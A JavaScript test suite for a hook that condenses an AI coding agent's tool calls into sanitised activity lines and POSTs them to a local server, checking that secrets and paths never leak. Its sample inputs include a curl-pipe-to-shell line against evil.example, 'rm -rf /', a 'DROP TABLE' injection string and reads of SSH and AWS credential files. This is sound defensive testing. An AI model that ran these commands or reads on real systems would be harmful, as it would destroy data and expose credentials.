// AS-103: the live tool-level activity producer, both halves.
//
// Two batteries in one file, because they are two halves of one contract:
//   1. lib/activity.js as a pure module — every reduction rule, every lane
//      derivation case, driven directly (AC-5, AC-6).
//   2. bin/activity-hook.mjs as a SPAWNED CHILD against a real socket — exit
//      code, stdout, stderr, wall clock, and the exact bytes it POSTs
//      (AC-12, AC-13, AC-14). Nothing here imports the hook: the contract
//      under test is what a process does, not what a function returns.
import test from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  ACTIVITY_FRAME_KEYS,
  ACTIVITY_MIN_INTERVAL_MS,
  ACTIVITY_TEXT_MAX,
  activityText,
  coarseObject,
  laneKeyFromCwd,
} from '../lib/activity.js';

const HOOK = resolve(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'activity-hook.mjs');

// The two cwds the SAME lane has to derive from: the hook runs on the host, the
// server reads the field inside a container over a bind mount. Both are real
// shapes, not illustrations — the first is this worktree's own path.
const HOST_CWD = '/Users/forrest/Code/american-software-company/.worktrees/AS-103';
const CONTAINER_CWD = '/app/.worktrees/AS-103';

// --- 1. the pure module ------------------------------------------------------

test('activity constants: the three exported values are the ones the rest of the system is written against', () => {
  assert.equal(ACTIVITY_MIN_INTERVAL_MS, 200);
  assert.equal(ACTIVITY_TEXT_MAX, 80);
  assert.deepEqual([...ACTIVITY_FRAME_KEYS], ['key', 'text', 'at']);
  // Frozen: the frame-key whitelist is a contract, and a contract a caller can
  // push() onto is not one.
  assert.equal(Object.isFrozen(ACTIVITY_FRAME_KEYS), true);
  assert.throws(() => ACTIVITY_FRAME_KEYS.push('employee'), TypeError);
});

test('AC-5 laneKeyFromCwd: host path, container path, nested subdirectory, main checkout, junk', () => {
  // M5's subject. The host and container paths share no prefix at all; a
  // derivation anchored on an absolute prefix gets exactly one of them.
  assert.equal(laneKeyFromCwd(HOST_CWD), 'AS-103');
  assert.equal(laneKeyFromCwd(CONTAINER_CWD), 'AS-103');
  assert.equal(laneKeyFromCwd('/repo/.worktrees/AS-103'), 'AS-103');

  // Nested: a stage sub-agent that cd'd deeper is still on its lane.
  assert.equal(laneKeyFromCwd('/x/.worktrees/AS-7/sub/dir'), 'AS-7');
  assert.equal(laneKeyFromCwd('/x/.worktrees/AS-7/'), 'AS-7');

  // The branch-slug form the worktree dir could take, and a multi-digit id.
  assert.equal(laneKeyFromCwd('/x/.worktrees/AS-1234-some-slug'), 'AS-1234');

  // The main checkout — the orchestrator, or a live metawork session. No lane,
  // no card to put it on (plan Q2), so the endpoint drops the frame.
  assert.equal(laneKeyFromCwd('/Users/forrest/Code/american-software-company'), null);
  // `.worktrees` present but not as a path segment.
  assert.equal(laneKeyFromCwd('/x/my.worktrees/AS-7'), null);
  // A worktree directory with no short code in its name.
  assert.equal(laneKeyFromCwd('/x/.worktrees/scratch'), null);
  // Non-strings and empties never throw — this runs on the request hot path.
  for (const bad of [null, undefined, '', 5, {}, [], true]) {
    assert.equal(laneKeyFromCwd(bad), null, `laneKeyFromCwd(${JSON.stringify(bad)})`);
  }
});

test('AC-6 coarseObject: one case per table row; the untamed input never survives the reduction', () => {
  // Read/Write/Edit — relative to the cwd when inside it.
  assert.equal(coarseObject('Read', { file_path: `${HOST_CWD}/apps/chat/server.js` }, HOST_CWD), 'apps/chat/server.js');
  assert.equal(coarseObject('Write', { file_path: `${HOST_CWD}/a/b.txt` }, HOST_CWD), 'a/b.txt');
  assert.equal(coarseObject('Edit', { file_path: `${HOST_CWD}/a/b.txt` }, HOST_CWD), 'a/b.txt');
  // …and OUTSIDE it, the basename only. Never an absolute host path.
  assert.equal(coarseObject('Read', { file_path: '/etc/passwd' }, HOST_CWD), 'passwd');
  assert.equal(coarseObject('Read', { file_path: '/Users/forrest/.ssh/id_ed25519' }, HOST_CWD), 'id_ed25519');
  // A missing cwd degrades to the same safe answer, never to the absolute path.
  assert.equal(coarseObject('Read', { file_path: `${HOST_CWD}/x.js` }), 'x.js');

  // M6's subject: a 4 KB command reduces to one program name.
  const fatCommand = `/usr/local/bin/docker compose -f x.yaml up --build ${'A'.repeat(4000)}`;
  const tok = coarseObject('Bash', { command: fatCommand });
  assert.equal(tok, 'docker');
  assert.ok(tok.length <= 24, `token ${tok.length} chars`);
  // A single absurdly long first token is clamped, not passed through.
  const longTok = coarseObject('Bash', { command: `${'z'.repeat(400)} --flag` });
  assert.equal(longTok.length, 24);

  // Grep/Glob: the pattern is DROPPED, so there is nothing left to clamp.
  assert.equal(coarseObject('Grep', { pattern: 'AWS_SECRET_ACCESS_KEY=(.*)' }), null);
  assert.equal(coarseObject('Glob', { pattern: '**/*.pem' }), null);

  assert.equal(coarseObject('Task', { subagent_type: 'qa-ruben' }), 'qa-ruben');
  assert.equal(coarseObject('WebFetch', { url: 'https://docs.stripe.com/connect/x?key=sekrit' }), 'docs.stripe.com');
  assert.equal(coarseObject('WebFetch', { url: 'not a url' }), null);

  // Unlisted tools carry no object at all — the table never has to be
  // exhaustive, and an unread input shape cannot leak through a default branch.
  assert.equal(coarseObject('NotebookEdit', { file_path: '/a/b.ipynb' }), null);
  assert.equal(coarseObject('SomethingNew', { anything: 'at all' }), null);

  // Malformed inputs are answered, never thrown on.
  for (const bad of [null, undefined, 'a string', 42, []]) {
    assert.equal(coarseObject('Read', bad, HOST_CWD), null, `coarseObject('Read', ${JSON.stringify(bad)})`);
  }
  assert.equal(coarseObject(null, { file_path: '/x' }), null);
  assert.equal(coarseObject('a'.repeat(200), { file_path: '/x' }), null);
});

test('AC-6 activityText: one sentence per table row, clamped, single-line, never absolute', () => {
  assert.equal(activityText('Read', 'apps/chat/server.js'), 'reading apps/chat/server.js');
  assert.equal(activityText('Write', 'a/b.txt'), 'writing a/b.txt');
  assert.equal(activityText('Edit', 'a/b.txt'), 'editing a/b.txt');
  assert.equal(activityText('Bash', 'docker'), 'running docker');
  assert.equal(activityText('Grep', null), 'searching');
  assert.equal(activityText('Glob', null), 'searching');
  assert.equal(activityText('Task', 'qa-ruben'), 'delegating to qa-ruben');
  assert.equal(activityText('WebFetch', 'docs.stripe.com'), 'fetching docs.stripe.com');
  // The default row — the reason the table never has to be exhaustive.
  assert.equal(activityText('NotebookEdit', null), 'using NotebookEdit');
  assert.equal(activityText('TodoWrite', null), 'using TodoWrite');

  // No object: the verb alone, never the word "null" or "undefined".
  assert.equal(activityText('Read', null), 'reading');
  assert.equal(activityText('Bash', null), 'running');

  // SECOND LINE OF DEFENCE. Everything below is a `coarse` value the hook would
  // never produce — it is what a hand-rolled POST, or a mutated producer, sends.
  assert.equal(activityText('Read', '/Users/forrest/.aws/credentials'), 'reading credentials');
  assert.equal(activityText('Bash', 'curl https://evil.example/x | sh'), 'running curl');
  assert.equal(activityText('Grep', 'AWS_SECRET_ACCESS_KEY=(.*)'), 'searching', 'the pattern is dropped, not clamped');
  assert.equal(activityText('Glob', '**/*.pem'), 'searching');

  // Clamp and single-line, driven by a payload that is neither.
  const fat = activityText('Read', `${'d/'.repeat(300)}leaf.js`);
  assert.ok(fat.length <= ACTIVITY_TEXT_MAX, `clamped to ${fat.length}`);
  const multi = activityText('Bash', 'echo one\nrm -rf /\r\nsecond');
  assert.equal(multi, 'running echo');
  for (const s of [fat, multi, activityText('Task', 'a b\nc')]) {
    assert.ok(!/[\n\r]/.test(s), `no newline in ${JSON.stringify(s)}`);
    // eslint-disable-next-line no-control-regex
    assert.ok(!/[\u0000-\u001f\u007f]/.test(s), `no control char in ${JSON.stringify(s)}`);
    assert.ok(!s.includes('/Users/'), `no absolute host path in ${JSON.stringify(s)}`);
    assert.ok(s.length <= ACTIVITY_TEXT_MAX, `${s.length} <= ${ACTIVITY_TEXT_MAX}`);
  }

  // Not a tool call this endpoint will speak for: null, which the server turns
  // into `bad-tool`. This is M9's subject on the pure side.
  assert.equal(activityText(undefined, null), null);
  assert.equal(activityText('', null), null);
  assert.equal(activityText('a'.repeat(200), null), null);
  assert.equal(activityText('Read; DROP TABLE', null), null);
  assert.equal(activityText('9Lives', null), null);
  assert.equal(activityText({}, null), null);
  // …and a non-string object, which the server turns into `bad-object`.
  assert.equal(activityText('Read', 42), null);
  assert.equal(activityText('Read', { file_path: '/x' }), null);
});

test('activity purity: lib/activity.js reads no fs, no clock and no process', async () => {
  // lib/lanes.js's rule, asserted the same way its own header claims it: by
  // reading the source. A clock in here would make every reduction above
  // untestable as an equality.
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(resolve(dirname(fileURLToPath(import.meta.url)), '..', 'lib', 'activity.js'), 'utf8');
  const body = src.replace(/^\s*(\/\/.*|\*.*|\/\*.*)$/gm, ''); // comments explain the rule; they are not the rule
  for (const forbidden of ['node:fs', 'Date.now', 'process.', 'readFileSync', 'new Date']) {
    assert.ok(!body.includes(forbidden), `lib/activity.js must not contain ${forbidden}`);
  }
});

// --- 2. the spawned hook -----------------------------------------------------

/** A one-shot POST collector on an ephemeral port. Records method, path,
 *  headers and the RAW body bytes, so the assertions below are about what the
 *  hook actually put on the wire rather than about what it meant to. */
async function collector(t, { status = 200, delayMs = 0 } = {}) {
  const seen = [];
  const waiters = [];
  const srv = createServer((req, res) => {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', () => {
      const hit = { method: req.method, url: req.url, contentType: req.headers['content-type'], raw };
      seen.push(hit);
      const w = waiters.shift();
      if (w) w(hit);
      const reply = () => {
        res.writeHead(status, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ activity: { accepted: true, reason: 'ok', key: 'AS-103', delivered: 0 } }));
      };
      if (delayMs) setTimeout(reply, delayMs).unref();
      else reply();
    });
  });
  await new Promise((ok) => srv.listen(0, '127.0.0.1', ok));
  t.after(() => new Promise((ok) => srv.close(ok)));
  return {
    url: `http://127.0.0.1:${srv.address().port}/api/activity`,
    seen,
    next: (ms = 4000) =>
      new Promise((ok, no) => {
        if (seen.length) return ok(seen[seen.length - 1]);
        const timer = setTimeout(() => no(new Error(`no POST within ${ms}ms`)), ms);
        waiters.push((hit) => {
          clearTimeout(timer);
          ok(hit);
        });
      }),
  };
}

/** A generous self-bound, for the cases whose subject is the POST BODY rather
 *  than the stopwatch. In the container the FIRST spawn of the hook pays a cold
 *  module-load cost that lands within tens of milliseconds of the production
 *  250 ms, and a test about which bytes cross the socket must not be decided by
 *  that. The same shape as server.js's injected poll cadences. The two cases
 *  whose subject IS the bound — the no-listener and the stalled-listener runs —
 *  deliberately do NOT pass this. */
const SLOW = { CHAT_ACTIVITY_DEADLINE_MS: '5000' };

/** The child's environment, with the two variables this script reads DELETED
 *  before the test's own are applied — an ambient CHAT_ACTIVITY_OFF in the
 *  runner's shell would otherwise silently pass the "posts nothing" cases. */
function childEnv(over) {
  const env = { ...process.env };
  delete env.CHAT_ACTIVITY_URL;
  delete env.CHAT_ACTIVITY_OFF;
  delete env.CHAT_ACTIVITY_DEADLINE_MS;
  return { ...env, ...over };
}

test('AC-12 hook: 250 ms is the pinned production self-bound', async () => {
  // The override above is a test knob, and a test knob is only honest if the
  // shipped default is pinned literally — the same rule api.test.js applies to
  // LOOP_POLL_MS / LANES_POLL_MS / EVENTS_POLL_MS.
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(HOOK, 'utf8');
  assert.match(src, /Number\(process\.env\.CHAT_ACTIVITY_DEADLINE_MS\) \|\| 250/,
    'the production default is 250 ms and the env var is only a fallback source');
});

/** Run the hook as the harness runs it: a child process, one JSON document on
 *  stdin, nothing else. Returns the exit code, both streams, and wall clock. */
function runHook(stdin, env = {}) {
  return new Promise((ok) => {
    const t0 = Date.now();
    const child = spawn(process.execPath, [HOOK], {
      env: childEnv(env),
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    let out = '';
    let err = '';
    child.stdout.on('data', (d) => (out += d));
    child.stderr.on('data', (d) => (err += d));
    child.on('close', (code, signal) => ok({ code, signal, out, err, ms: Date.now() - t0 }));
    child.stdin.on('error', () => {}); // an EPIPE from a child that stopped reading is not the test's failure
    child.stdin.end(stdin);
  });
}

/** The harness's own payload shape. Only cwd / tool_name / tool_input are read
 *  — the rest is here precisely to prove that (AC-14). */
const preToolUse = (over = {}) => JSON.stringify({
  session_id: 'sess-abc123',
  transcript_path: '/Users/forrest/.claude/projects/x/y.jsonl',
  hook_event_name: 'PreToolUse',
  cwd: HOST_CWD,
  tool_name: 'Read',
  tool_input: { file_path: `${HOST_CWD}/apps/chat/server.js` },
  ...over,
});

test('AC-12 hook: a PreToolUse payload becomes exactly one POST of {cwd,tool,object}, exit 0, both streams empty', async (t) => {
  const sink = await collector(t);
  const run = await runHook(preToolUse(), { CHAT_ACTIVITY_URL: sink.url, ...SLOW });
  const hit = await sink.next();

  assert.equal(run.code, 0, 'rule 1: always exit 0');
  assert.equal(run.out, '', 'rule 2: nothing on stdout');
  assert.equal(run.err, '', 'rule 2: nothing on stderr');
  assert.equal(hit.method, 'POST');
  assert.equal(hit.url, '/api/activity');
  assert.match(hit.contentType, /^application\/json/);
  // The exact body, key set included: nothing about the session, the
  // transcript, or the tool input crosses the socket.
  assert.deepEqual(JSON.parse(hit.raw), {
    cwd: HOST_CWD,
    tool: 'Read',
    object: 'apps/chat/server.js',
  });
  assert.deepEqual(Object.keys(JSON.parse(hit.raw)).sort(), ['cwd', 'object', 'tool']);
  assert.equal(sink.seen.length, 1, 'exactly one POST per tool call');
});

test('AC-12 hook: the reduction happens at the SOURCE — no command line, pattern or file body crosses the socket', async (t) => {
  const sink = await collector(t);
  const secret = `/usr/local/bin/docker compose -f x.yaml up --build --env TOKEN=sk_live_${'9'.repeat(40)}`;
  await runHook(
    preToolUse({ tool_name: 'Bash', tool_input: { command: secret } }),
    { CHAT_ACTIVITY_URL: sink.url, ...SLOW }
  );
  const bash = await sink.next();
  assert.deepEqual(JSON.parse(bash.raw), { cwd: HOST_CWD, tool: 'Bash', object: 'docker' });
  assert.ok(!bash.raw.includes('sk_live_'), 'the token never left the host process');

  const sink2 = await collector(t);
  await runHook(
    preToolUse({ tool_name: 'Grep', tool_input: { pattern: 'AWS_SECRET_ACCESS_KEY=(.*)', path: '/etc' } }),
    { CHAT_ACTIVITY_URL: sink2.url, ...SLOW }
  );
  const grep = await sink2.next();
  assert.deepEqual(JSON.parse(grep.raw), { cwd: HOST_CWD, tool: 'Grep', object: null });
  assert.ok(!grep.raw.includes('AWS_SECRET'), 'the pattern never left the host process');
});

test('AC-14 hook: PostToolUse and PreToolUse fixtures produce a byte-identical body', async (t) => {
  // Q1 is a settings-only flip precisely because of this: the script reads
  // cwd / tool_name / tool_input and nothing else, so the two events differ
  // only in fields it never touches.
  const sinkPre = await collector(t);
  await runHook(preToolUse(), { CHAT_ACTIVITY_URL: sinkPre.url, ...SLOW });
  const pre = await sinkPre.next();

  const sinkPost = await collector(t);
  await runHook(
    preToolUse({
      hook_event_name: 'PostToolUse',
      tool_response: { type: 'text', file: { numLines: 1200, content: 'the whole file body' } },
    }),
    { CHAT_ACTIVITY_URL: sinkPost.url, ...SLOW }
  );
  const post = await sinkPost.next();

  assert.equal(post.raw, pre.raw, 'the two hook events post the same bytes');
  assert.ok(!post.raw.includes('the whole file body'), 'a PostToolUse response body is never read');
});

test('AC-12 hook: nothing listening — exit 0, silent, and under a second of wall clock', async () => {
  // M11's subject. The port is bound to nothing: fetch rejects with
  // ECONNREFUSED, and the .catch() is the whole of "always exit 0" here.
  const run = await runHook(preToolUse(), { CHAT_ACTIVITY_URL: 'http://127.0.0.1:1/api/activity' });
  assert.equal(run.code, 0, 'a chat server that is down must never fail a tool call');
  assert.equal(run.out, '');
  assert.equal(run.err, '');
  assert.ok(run.ms < 1000, `wall clock ${run.ms}ms < 1000ms`);
});

test('AC-12 hook: a server that never answers is abandoned at the deadline, still exit 0 and silent', async (t) => {
  // The other half of the self-bound: a listener that accepts and then stalls.
  const sink = await collector(t, { delayMs: 5_000 });
  const run = await runHook(preToolUse(), { CHAT_ACTIVITY_URL: sink.url });
  assert.equal(run.code, 0);
  assert.equal(run.err, '');
  assert.ok(run.ms < 1500, `wall clock ${run.ms}ms — the script self-bounds well under the harness timeout`);
});

test('AC-12 hook: garbage, empty and 1 MB stdin all exit 0 silently and post nothing', async (t) => {
  const sink = await collector(t);
  const cases = [
    ['garbage', 'not json at all {{{'],
    ['empty', ''],
    ['json but not an object', '[1,2,3]'],
    ['object with no tool_name', JSON.stringify({ cwd: HOST_CWD })],
    ['1 MB', 'x'.repeat(1_000_000)],
  ];
  for (const [label, stdin] of cases) {
    const run = await runHook(stdin, { CHAT_ACTIVITY_URL: sink.url, ...SLOW });
    assert.equal(run.code, 0, `${label}: exit 0`);
    assert.equal(run.out, '', `${label}: silent stdout`);
    assert.equal(run.err, '', `${label}: silent stderr`);
  }
  // Give any stray POST a beat to arrive before asserting it did not.
  await new Promise((ok) => setTimeout(ok, 200));
  assert.equal(sink.seen.length, 0, 'a payload the script cannot read produces no frame');
});

test('AC-13 hook: CHAT_ACTIVITY_OFF=1 exits 0 and posts nothing', async (t) => {
  // M12's subject. The kill switch is read before stdin, so it also proves the
  // script cannot be kept alive by a payload it was told not to send.
  const sink = await collector(t);
  const off = await runHook(preToolUse(), { CHAT_ACTIVITY_URL: sink.url, CHAT_ACTIVITY_OFF: '1', ...SLOW });
  assert.equal(off.code, 0);
  assert.equal(off.out, '');
  assert.equal(off.err, '');
  await new Promise((ok) => setTimeout(ok, 200));
  assert.equal(sink.seen.length, 0, 'the switch is off — nothing posted');

  // …and the switch is exactly '1', not "any truthy value": a stale
  // CHAT_ACTIVITY_OFF=0 in an environment must not silently disable the layer.
  const on = await runHook(preToolUse(), { CHAT_ACTIVITY_URL: sink.url, CHAT_ACTIVITY_OFF: '0', ...SLOW });
  assert.equal(on.code, 0);
  await sink.next();
  assert.equal(sink.seen.length, 1);
});

test('AC-12 hook: a non-2xx answer is still exit 0 and silent (the producer never interprets the reply)', async (t) => {
  const sink = await collector(t, { status: 500 });
  const run = await runHook(preToolUse(), { CHAT_ACTIVITY_URL: sink.url, ...SLOW });
  await sink.next();
  assert.equal(run.code, 0);
  assert.equal(run.out, '');
  assert.equal(run.err, '');
});
